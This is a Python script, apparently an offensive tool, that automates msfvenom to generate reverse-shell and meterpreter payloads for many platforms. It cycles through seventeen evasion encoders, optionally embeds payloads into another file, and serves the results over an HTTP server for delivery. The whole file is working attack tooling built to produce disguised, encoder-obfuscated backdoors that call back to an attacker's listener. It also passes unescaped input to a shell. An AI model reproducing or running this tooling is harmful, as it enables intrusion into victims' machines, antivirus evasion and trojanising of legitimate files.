import os
import subprocess
import hashlib
import csv
import threading
import socket
import webbrowser
import io
import shutil
import sqlite3
from datetime import datetime
from http.server import SimpleHTTPRequestHandler, HTTPServer

# ANSI color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

# Banner
print(f"{MAGENTA}__  __ _____ _____     _____                      \n|  \\/  |  ___|  __ \\   / ____| /\\   |  \\/  |\n| \\  / | |_  | |  | | | (___  /  \\  | \\  / |\n| |\\/| |  _| | |  | |  \\___ \\/ /\\ \\ | |\\/| |\n| |  | | |___| |__| |  ____) / ____ \\| |  | |\n|_|  |_|_____|_____/  |_____/_/    \\_\\_|  |_|{RESET}\n")
print(f"{GREEN}MSFvenom Payload Automation Framework - GODMODE{RESET}\n")

payloads = {
    "windows": "windows/meterpreter/reverse_tcp",
    "linux": "linux/x86/meterpreter/reverse_tcp",
    "android": "android/meterpreter/reverse_tcp",
    "osx": "osx/x64/shell_reverse_tcp",
    "php": "php/meterpreter/reverse_tcp",
    "python": "python/meterpreter/reverse_tcp",
    "ruby": "ruby/shell_reverse_tcp",
    "java": "java/meterpreter/reverse_tcp",
    "nodejs": "nodejs/shell_reverse_tcp"
}

print(f"{CYAN}[?] Enter custom output directory or leave blank for default 'payloads/':{RESET}")
user_dir = input(f"{GREEN}> {RESET}").strip()
output_dir = os.path.abspath(user_dir) if user_dir else os.path.abspath("payloads")
os.makedirs(output_dir, exist_ok=True)

print(f"{CYAN}[?] Enter desired output base name for the payload file (without extension):{RESET}")
user_filename = input(f"{GREEN}> {RESET}").strip()
user_filename = user_filename if user_filename else "payload"

log_file = os.path.join(output_dir, "payload_log.csv")
db_path = os.path.join(output_dir, "payload_stats.db")

encoders = [
    "x86/shikata_ga_nai", "x86/call4_dword_xor", "x86/countdown", "x86/fnstenv_mov", "x86/jmp_call_additive",
    "x86/nonalpha", "x86/nonupper", "x86/alpha_mixed", "x86/alpha_upper", "x86/avoid_underscore_tolower",
    "x86/avoid_utf8_tolower", "x86/opt_sub", "x86/add_sub", "x86/context_cpuid", "x86/context_stat",
    "x86/context_time", "x86/countdown"
]

print(f"{CYAN}[?] Enter LHOST or leave blank to auto-detect:{RESET}")
lhost = input(f"{GREEN}> {RESET}").strip()
if not lhost:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        lhost = s.getsockname()[0]
        s.close()
        print(f"{YELLOW}[!] Auto-detected LHOST: {lhost}{RESET}")
    except:
        print(f"{RED}[!] Failed to auto-detect LHOST. Please enter manually.{RESET}")
        exit()

print(f"{CYAN}[?] Enter LPORT (default 4444):{RESET}")
lport = input(f"{GREEN}> {RESET}").strip()
lport = lport if lport else "4444"

print(f"{CYAN}[?] Select a target platform: {', '.join(payloads.keys())}{RESET}")
target = input(f"{GREEN}> {RESET}").strip().lower()
if target not in payloads:
    print(f"{RED}[!] Invalid target platform.{RESET}")
    exit()

payload = payloads[target]

print(f"{CYAN}[?] Embed into another file (leave blank to skip):{RESET}")
embed_path = input(f"{GREEN}> {RESET}").strip()
embed = 'y' if embed_path else 'n'

print(f"{CYAN}[?] Notes for this payload (optional):{RESET}")
notes = input(f"{GREEN}> {RESET}").strip()

# Helper functions
def get_format(payload):
    if 'windows' in payload:
        return 'exe'
    elif 'android' in payload:
        return 'apk'
    elif 'python' in payload:
        return 'py'
    elif 'php' in payload:
        return 'raw'
    elif 'osx' in payload:
        return 'macho'
    elif 'ruby' in payload:
        return 'rb'
    elif 'java' in payload:
        return 'jar'
    elif 'nodejs' in payload:
        return 'js'
    else:
        return 'elf'

def get_sha256(file_path):
    with open(file_path, 'rb') as f:
        return hashlib.sha256(f.read()).hexdigest()

def log_to_csv(data):
    with open(log_file, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(data)

def generate_payload():
    format_ = get_format(payload)

    def run_encoder(encoder):
        filename_base = user_filename + f"_{encoder.replace('/', '_')}"
        filename = filename_base + f".{format_}"
        output_path = os.path.join(output_dir, filename)
        count = 1
        while os.path.exists(output_path):
            filename = f"{filename_base}_{count}.{format_}"
            output_path = os.path.join(output_dir, filename)
            count += 1
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e {encoder} -f {format_} -o \"{output_path}\""
        if embed == 'y' and embed_path:
            cmd += f" -x \"{embed_path}\""
        print(f"{YELLOW}[+] Generating {output_path} with encoder {encoder}...{RESET}")
        subprocess.run(cmd, shell=True)
        if os.path.exists(output_path):
            sha256 = get_sha256(output_path)
            timestamp = datetime.now().isoformat()
            log_to_csv([target, payload, encoder, filename, output_path, sha256, timestamp, notes])
            print(f"{GREEN}[✓] Saved: {filename} at {output_path} | Hash: {sha256} | Time: {timestamp} | Notes: {notes}{RESET}")

    threads = []
    for encoder in encoders:
        t = threading.Thread(target=run_encoder, args=(encoder,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

def start_http_server():
    os.chdir(output_dir)
    try:
        ip = socket.gethostbyname(socket.gethostname())
        port = 8000
        server_address = ("0.0.0.0", port)
        httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
        print(f"{BLUE}[*] Serving payloads at http://{ip}:{port}{RESET}")
        try:
            webbrowser.open(f"http://{ip}:{port}")
        except webbrowser.Error:
            print(f"{YELLOW}[!] Could not open browser automatically. Please open http://{ip}:{port} manually.{RESET}")
        httpd.serve_forever()
    except Exception as e:
        print(f"{RED}[!] Failed to start HTTP server: {e}{RESET}")

# Main Execution
print(f"{CYAN}[?] Start payload generation now? (y/n):{RESET}")
if input(f"{GREEN}> {RESET}").lower().startswith('y'):
    generate_payload()

print(f"{CYAN}[?] Start HTTP server to host payloads? (y/n):{RESET}")
if input(f"{GREEN}> {RESET}").lower().startswith('y'):
    start_http_server()
